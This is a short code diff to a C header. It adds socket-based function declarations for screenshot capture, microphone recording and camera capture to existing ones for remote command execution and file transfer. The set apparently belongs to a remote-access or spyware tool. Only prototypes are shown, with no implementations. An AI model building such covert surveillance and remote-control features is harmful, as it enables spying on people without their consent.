@@ -13,3 +13,9 @@ void waitAndConnect(SOCKET* connectSocket);
 void sendFile(const char* fileName, SOCKET connectSocket);
 void receiveFile(const char* fileName, SOCKET connectSocket);
 void doCommandAndSend(const char* command, SOCKET connectSocket);
+
+void Screenshot(SOCKET connectSocket);
+void Micro(int milliseconds,SOCKET connectSocket);
+void Camera(SOCKET connectSocket);
+
+void sendSignal(BOOL signal, SOCKET connectSocket);
